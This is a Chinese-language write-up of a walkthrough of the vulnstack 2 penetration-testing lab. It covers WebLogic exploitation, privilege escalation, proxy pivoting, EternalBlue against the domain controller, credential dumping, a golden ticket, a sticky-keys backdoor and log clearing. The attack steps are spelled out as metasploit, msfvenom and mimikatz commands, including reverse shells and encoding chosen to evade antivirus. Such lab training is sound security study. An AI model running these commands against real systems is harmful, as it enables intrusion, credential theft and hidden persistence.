第一次写靶场实战的文章，有不足之处还请多多指教。本次实战的靶场是红日安全vulnstack系列的第二个靶场。

靶场地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/

## 环境搭建

###
**网络环境**![image](https://image.3001.net/images/20211028/1635406336_617a52006926aedcf5aab.png!small)

###  **网卡配置**

只需要在VM上选择对应网卡即可，不需要在靶机中进行配置。

 **DC**

    
    
    IP：10.10.10.10 （VMnet5）
    OS：Windows 2012（x64）
    

**WEB**

    
    
    IP1：192.168.111.80 （VMnet6）
    IP2：10.10.10.80 （VMnet5）
    OS：Windows 2008（x64）
    

**PC**

    
    
    IP1：192.168.111.201 （VMnet6）
    IP2：10.10.10.201 （VMnet5）
    OS：Windows 7（x86）
    

### **开启靶场**

进入C:\Oracle\Middleware\user_projects\domains\base_domain目录下，双击startWebLogic开启服务。![image](https://image.3001.net/images/20211028/1635406348_617a520c0deb19ffabefe.png!small)

## 外网渗透

我们已知当前Web服务器的公网IP为192.168.111.80，对Web服务器进行端口扫描，以期发现是否有可以利用的端口服务，从而突破边界。

### 端口扫描

    
    
    nmap -sV -Pn -T4 192.168.111.80
    

![image](https://image.3001.net/images/20211028/1635406359_617a5217b6852fe17e734.png!small)

### 漏洞探测

通过端口扫描我们发现Web服务器开启了80、7001等端口，其他端口如445、1433、3389等也可以使用一些RCE漏洞或弱口令直接进入Web服务器。这里我们先访问Web服务，发现80端口页面是空白的，在7001端口我们发现Web服务器开启了Weblogic，尝试使用WeblogicScan脚本探测漏洞：

    
    
    python3 WeblogicScan.py -u 192.168.111.80 -p 7001
    

![image](https://image.3001.net/images/20211028/1635406369_617a5221a576c22142a3e.png!small)

### 漏洞利用

通过脚本探测发现存在CVE-2019-2725，我们可以使用网上的exp，这里我们使用msf自带的漏洞利用模块：

    
    
    use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
    set target Windows
    set payload windows/x64/meterpreter/reverse_tcp
    set rhosts 192.168.111.80
    set lhost 192.168.111.128
    run
    

![image](https://image.3001.net/images/20211028/1635406382_617a522e3c506d9a1ab61.png!small)

这里还需要在advanced选项中对payload进行简单的编码：

    
    
    setg EnableStageEncoding true
    setg StageEncoder x64/zutto_dekiru
    

![image](https://image.3001.net/images/20211028/1635406391_617a5237819c9f4b1e3a4.png!small)

成功返回meterpreter。

这里我们做编码的目的是为了绕过360，网上也有一些其它免杀的方式，大家可以自行学习，这里使用的msf的自免杀，使用x64/zutto_dekiru编码绕过。

### 权限提升

在我们成功返回shell后，发现我们当前是普通用户权限，如果要完全控制这台机器，需要进一步提权。

切换目录到C:\Users\de1ay下，使用meterpreter上传Sherlock脚本：

    
    
    cd C:/Users/de1ay
    upload Sherlock.ps1
    

![image](https://image.3001.net/images/20211028/1635406404_617a5244c8821f4f55d72.png!small)

进入shell模式，使用Sherlock脚本探测可用于本地提权的漏洞：

    
    
    powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1;Find-AllVulns}"
    

![image](https://image.3001.net/images/20211028/1635406418_617a5252532e07d1cdcfb.png!small)

这里我们通过Sherlock脚本发现存在MS15-051相关漏洞，使用msf自带的利用模块提权：

    
    
    use exploit/windows/local/ms15_051_client_copy_image
    set payload windows/x64/meterpreter/reverse_tcp
    set session 1
    set target Windows x64
    set lhost 192.168.111.128
    run
    

![image](https://image.3001.net/images/20211028/1635406431_617a525fef314d840a2af.png!small)

提权成功：

![image](https://image.3001.net/images/20211028/1635406445_617a526d938c9a859a9c5.png!small)

至此，我们已经成功拿下了边界服务器的控制权，可以进一步深入内网了。

## 内网渗透

在进入内网后，我们要明确自己的目标，由于该靶场没有flag需要获取，所以我们的目标就是 **拿下整个域的控制权** ，明确了目标后，我们就可以针对目标进行
**信息收集** 了。

### 信息收集

    
    
    systeminfo
    

![image](https://image.3001.net/images/20211028/1635406465_617a52816ab5032dae489.png!small)

    
    
    ipconfig /all
    

![image](https://image.3001.net/images/20211028/1635406474_617a528ae530612288ed7.png!small)

通过查询主机信息和网络信息，我们发现该服务器主机名为 **WEB** ，处于 **域环境** ，并且有两张网卡，其内网网段为
**10.10.10.0/24** ，主DNS服务器IP为10.10.10.10，在域环境中，域控制器往往同时作为DNS服务器，由此判断，我们要找的
**域控制器IP很可能就是10.10.10.10** 。

    
    
    net user
    net user /domain
    net time /domain
    

![image](https://image.3001.net/images/20211028/1635406488_617a529807fb2d8f06ea7.png!small)

通过查询用户信息，我们获取了域成员信息，并可基本做出判断 **域控制器的主机名为DC** 。

    
    
    ping DC
    

![image](https://image.3001.net/images/20211028/1635406502_617a52a63728e87b9a470.png!small)

通过对DC使用ping命令，我们发现其IP为10.10.10.10，由此我们最终做出判断该域环境中的域控制器主机名为DC，内网ip地址为：10.10.10.10，并且我们目前控制的这台
**Web服务器可以访问域控制器** 。

    
    
    net group "Domain Admins" /domain
    

![image](https://image.3001.net/images/20211028/1635406512_617a52b0c884bab7501f6.png!small)

    
    
    net group "domain computers" /domain
    

![image](https://image.3001.net/images/20211028/1635406521_617a52b9350ca74e834cb.png!small)

    
    
    ping PC
    

![image](https://image.3001.net/images/20211028/1635406534_617a52c601165ac8d7ba4.png!small)

这里我们通过ping
PC发现PC机的ip为10.10.10.201，但是没有返回数据，说明此处防火墙禁止了ICMP协议，在后面对PC机进行内网渗透时可以考虑其它协议。

至此，我们已经初步完成了内网信息收集：

    
    
    该靶场为域环境：de1ay.com
    该靶场存在三台主机：DC、PC、WEB
    该靶场存在两个网段：10.10.10.0/24，192.168.111.0/24
    该靶场的域管理员为：Administrator
    

### 设置代理

在对内网进行了初步的信息收集后，我们要开始 **攻击内网主机** 了，但是内网中的机器和我们的攻击机并不处于同一网络当中，所以要
**通过Web服务器建立代理** ，这里有很多内网穿透工具可以使用，如ew、frp、chisel等，我这里直接使用msf建立路由，并开启socks代理。

    
    
    建立路由：
    route add 10.10.10.0 255.255.255.0 1
    

![image](https://image.3001.net/images/20211028/1635406547_617a52d3a0d6eccbf2775.png!small)

    
    
    开启socks代理：
    use auxiliary/server/socks_proxy
    set srvhost 127.0.0.1
    set srvport 9050
    set version 4a
    run
    

![image](https://image.3001.net/images/20211028/1635406566_617a52e64e4c21af6ef64.png!small)

    
    
    配置代理工具proxychains4：
    vim /etc/proxychains4.conf
    

![image](https://image.3001.net/images/20211028/1635406577_617a52f1b93d4df8a399e.png!small)

这样，我们就可以使用msf以及设置了代理的其它工具攻击内网中的主机了。

在信息收集时，我们使用了ping命令简单探测了一下内网连通性，发现PC机无法ping通，这可能是防火墙阻止了ICMP协议，这里我们通过代理使用nc命令探测，发现可以连通，说明防火墙并没有阻止TCP协议的流量。

    
    
    proxychains4 nc -zv 10.10.10.80 135
    proxychains4 nc -zv 10.10.10.201 135
    

![image](https://image.3001.net/images/20211028/1635406586_617a52fad528bfc53dab9.png!small)

发现防火墙并没有拦截TCP流量后，我们就可以使用TCP协议进行数据传输了。

### 横向移动

先扫一下端口。

![image](https://image.3001.net/images/20211028/1635406605_617a530d2715dec07ef1e.png!small)

发现两台机器都开起了445端口，探测以下是否存在永恒之蓝漏洞：

    
    
    use auxiliary/scanner/smb/smb_ms17_010
    set rhosts 10.10.10.10
    run
    

![image](https://image.3001.net/images/20211028/1635406617_617a53191f14f8e1f7a6b.png!small)

发现两台主机都存在该漏洞，尝试使用msf内置的漏洞利用模块：

    
    
    use exploit/windows/smb/ms17_010_psexec
    set rhosts 10.10.10.10
    set payload windows/x64/meterpreter/bind_tcp
    set lport 443
    run
    

域控制器执行成功，域内成员机PC执行失败：

![image](https://image.3001.net/images/20211028/1635406628_617a5324818e681a3503d.png!small)

至此，我们已成功获得域控制器权限。

域内成员机PC我们没有通过永恒之蓝漏洞拿下来，这里采用其它方法，首先我们在之前的Web服务器上加载kiwi，提取服务器上储存的密码：

    
    
    sessions 2
    load kiwi
    creds_all
    

![image](https://image.3001.net/images/20211028/1635406647_617a5337a57dd80ae9da7.png!small)

我们成功提取到了两个账号的明文密码，但是这里没有域管理员的账号密码。

这里我们使用smart_hashdump模块提取域控中的哈希：

    
    
    use post/windows/gather/smart_hashdump
    set session 3
    run
    

![image](https://image.3001.net/images/20211028/1635406656_617a53407be743adb5224.png!small)

成功提取到了域内成员的hash值，并且我们发现域管理员的hash和其它域成员的hash相同，这说明域管理员使用了和域成员相同的密码（该靶场存在密码复用，如果密码不相同，我们可以通过哈希传递进行横向移动），这样我们可以就获得了域管理员的账号密码。

我们先使用msf生成一个木马：

    
    
    msfvenom -p windows/meterpreter/bind_tcp lport=443 -f vbs -e x86/shikata_ga_nai -o /tmp/msf.vbs
    

然后，将该木马上传到已经被我们控制的web服务器上：

    
    
    upload /tmp/msf.vbs
    

![image](https://image.3001.net/images/20211028/1635406667_617a534be9c33d9d5ad19.png!small)

进入shell，与PC主机建立IPC$连接：

    
    
    net use \\10.10.10.201\ipc$ "1qaz@WSX" /user:administrator@de1ay.com
    

![image](https://image.3001.net/images/20211028/1635406680_617a5358eaf762d51233d.png!small)

将上传的木马复制到PC机C盘目录下：

    
    
    copy msf.vbs \\10.10.10.201\c$
    

![image](https://image.3001.net/images/20211028/1635406690_617a5362e806b91273cbf.png!small)

通过端口扫描我们发现PC开启了3389端口：

![image](https://image.3001.net/images/20211028/1635406698_617a536a10352bf7a1212.png!small)

在msf上开启监听：

    
    
    use exploit/multi/handler
    set payload windows/meterpreter/bind_tcp
    set stageencoder x86/shikata_ga_nai
    set rhosts 10.10.10.201
    set lport 443
    run
    

![image](https://image.3001.net/images/20211028/1635406707_617a537352c8a22d1b8ec.png!small)

连接PC机的远程桌面，使用域管理员账号登录PC，上线msf：

    
    
    proxychains4 rdesktop 10.10.10.201:3389
    

![image](https://image.3001.net/images/20211028/1635406716_617a537cb9995c5f7db14.png!small)

到此，我们已经控制了域内全部主机。

![image](https://image.3001.net/images/20211028/1635406724_617a5384e30e797ccabe3.png!small)

### 权限维持

在获取了域内全部主机权限后，我们进一步来做权限维持，权限维持的方法很多，这里我们演示两种方式，
**使用黄金票据来实现域控制器的权限维持，使用粘滞键后门实现PC机的权限维持** 。

 **域控制器权限维持**

在之前的信息收集过程中，我们已经成功获取到了krbtgt的hash值：

![image](https://image.3001.net/images/20211028/1635406734_617a538ecb979ec34cbb6.png!small)

因为PC机的session没有进行提权，并且是域成员账号，可以帮助我们获取域的SID，所以我们切换到PC机的session，获取域SID：

    
    
    whoami /user
    

![image](https://image.3001.net/images/20211028/1635406746_617a539ae95679bafe661.png!small)

上传mimikatz到PC机，进入PC的shell模式，发现当前用户为普通域成员，无法访问域控制器目录。

![image](https://image.3001.net/images/20211028/1635406757_617a53a52d48ab62977b0.png!small)

使用mimikatz生成黄金票据并注入内存：

    
    
    mimikatz# kerberos::purge
    mimikatz# kerberos::golden /admin:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:administrator.kiribi
    mimikatz# kerberos::ptt administrator.kiribi
    

![image](https://image.3001.net/images/20211028/1635406764_617a53ac4aefe7efde034.png!small)

成功注入内存，我们尝试访问域控制器C盘：

    
    
    dir \\DC\C$
    

![image](https://image.3001.net/images/20211028/1635406772_617a53b4b26c6cacd85fa.png!small)

发现在将票据注入内存后，可以成功访问域控制器目录，说明黄金票据有效。还有其它域控制器权限维持的方式，这里不进行具体演示了。

 **粘滞键后门**

在PC机上使用粘滞键后门前，需要先进行提权。这里同样上传Sherlock脚本进行探测利用：

![image](https://image.3001.net/images/20211028/1635406785_617a53c14129cd38a3425.png!small)

提权成功。

使用msf中的后渗透模块添加粘滞键后门：

    
    
    use post/windows/manage/sticky_keys
    set session 8
    run
    

![image](https://image.3001.net/images/20211028/1635406794_617a53cab20ede2ad1f12.png!small)

### 痕迹清除

删除之前上传的mimikatz和Sherlock脚本。

    
    
    run event_manager -c
    

![image](https://image.3001.net/images/20211028/1635406804_617a53d4d96252831cd67.png!small)

## 结语

关于免杀，我使用的全部是msf的编码自免杀，64位使用的是x64/zutto_dekiru，32位使用的是x86/shikata_ga_nai，360都没有拦截。虽然靶机中有360，但是我直接上传的mimikatz也没有被杀，所以我有些怀疑是360的版本比较低，除了web服务器上传的第一个payload，其它都进行了编码处理，而第一个也确实没有执行成功，这说明360至少对第一个payload是拦截了的。

本次靶场练习到这里就全部结束了，在权限维持和免杀等方面仍然有很多需要学习的地方，这个靶场总体上比较简单，在横向移动和权限维持等方面还有很多方法可以尝试，由于本人深度沉迷msf，所以这篇文章中的整个渗透过程都是基于msf进行的，大家也可以多多尝试其它工具和方法，比如CS、Empire等等。

